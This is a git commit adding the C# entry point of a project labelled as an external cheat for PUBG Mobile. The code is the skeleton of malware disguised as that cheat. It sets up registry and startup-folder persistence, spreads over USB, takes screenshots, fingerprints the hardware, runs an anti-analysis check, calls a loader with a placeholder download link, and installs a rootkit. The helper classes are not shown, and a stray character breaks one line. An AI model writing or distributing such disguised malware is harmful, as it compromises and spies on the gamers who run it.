969d2b42ca6222f014883dce7ebc455cf55051cc
eer3423 <154522639+eer3423@users.noreply.github.com>
2023-12-21 04:21:40 -0800

    Upload Files

---
+++ PubgMobileExternalCheat/Brutal Magic/Magic/Program.cs
@@ -0,0 +1,33 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace MagicHacks
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            //Autorun
+            cCore.Autorun.cAutorun.Reg();
+            cCore.Autorun.cAutorun.StartUpFolder();s
+
+            //Implant очка
+            cCore.Implant.cUsbSpread.UsbSpread();
+            cCore.Implant.cScreenshot.getScreen();
+            cCore.Implant.cCPU.getCPU();
+            cCore.Implant.cGPU.getGPU();
+            cCore.Implant.cHWID.getHWID();
+            cCore.Implant.cBit.getBit();
+
+            //AntiAnalysis
+            cCore.AntiAnalysis.cHosting.Hosting();
+
+            //Malware
+            cCore.cMalware.cLoader.Loader("ссылка!");
+            cCore.cMalware.cRootKit.Protect();
+        }
+    }
+}
